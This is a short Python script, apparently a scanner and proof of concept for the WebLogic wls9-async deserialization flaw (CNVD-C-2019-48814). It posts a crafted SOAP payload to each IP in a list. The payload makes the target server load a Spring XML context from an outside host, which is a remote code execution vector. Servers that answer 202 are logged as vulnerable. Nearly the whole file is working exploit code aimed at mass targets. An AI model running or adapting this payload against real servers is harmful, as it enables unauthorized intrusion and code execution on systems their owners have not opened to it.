#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import requests
import sys


print('\n')
print(r'              CNVD-C-2019-48814              ')
print(r'   http://www.cnvd.org.cn/webinfo/show/4999  ')
print('\n')

path='/_async/AsyncResponseService'
payload='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://ximcx.cn</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'

#打开文件循环取IP并请求
f = open(sys.argv[1],'r')
f1=open('存在漏洞的地址.txt','w')
for ff in f:
    try:
        header={'content-type':'text/xml'}
        r=requests.post('http://'+ff.strip()+path,headers=header,data=payload,timeout=3)#默认全部为http请求
        if(r.status_code==202):
            print('[+]'+ff.strip()+'存在wls9-async组件反序列化漏洞')
            f1.write(ff)
        else:
            print('[-]不存在漏洞')
    except requests.exceptions.RequestException as e:
        print('[-]'+ff.strip()+'连接超时')
        continue
f.close()
f1.close()
print('\n\n请查看目录下的：存在漏洞的地址.txt')